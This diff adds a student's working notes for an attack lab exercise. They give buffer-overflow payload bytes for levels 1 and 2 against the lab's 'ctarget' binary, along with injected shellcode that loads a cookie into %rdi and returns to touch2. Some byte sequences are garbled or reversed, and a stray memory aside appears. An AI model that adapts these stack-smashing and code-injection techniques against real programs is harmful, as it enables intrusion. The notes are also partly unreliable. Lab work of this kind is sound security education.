@@ -1,0 +1,51 @@
+./hex2raw <ans1.txt> ans1.raw
+./ctarget -q -i ans1.raw
+
+
+LEVEL 1.
+
+touch1 startaddress : 00 00 00 00 00 40 17 d9
+L> little endian : d9 17 40 00 00 00 00 00
+buffer size 28byte
+trash code : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+SomeAdvice: 
+Use objdump -d
+The placement ofbufwithin the stack frame forgetbufdepends on the value of compile-timeconstantBUFFER_SIZE, as well the allocation strategy used byGCC. You will need to examine thedisassembled code to determine its position
+
+ans1 = 
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00//28byte 00 00 00 00
+//32byte
+00 00 00 00 00 00 00 00 //segmentationfault
+d9 17 40 00 00 00 00 null //16byte
+
+
+maybe 4gb + 4gb = 8gb mem 64bit to efficiently
+|---------4gb---------| |---------4gb---------|
+1 2 3 4 5 6 7 8		1 2 3 4 5 6 7 8
+
+
+LEVEL2.
+
+Cookie : 0x59b997fa
+L> little endian : fa 97 b9 59
+touch2 startaddress : 00 00 00 00 00 40 18 05
+L> little endian : 05 18 40 00 00 00 00
+
+SomeAdvice:
+I will want to position a byte representation of the address of my injected code. ret will get me there
+parameter in %rdi
+my code should set reg to cookie then use ret 
+
+%rsp : 0x5561dca0
+%rsp - 0x28 : 0x5561dc78
+L>a0 dc 61 55
+0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
+7:	68 05 18 40 00       	pushq  $0x401805
+
+59 b9 97 fa c7 c7 48
+00 40 18 05 68
+c3
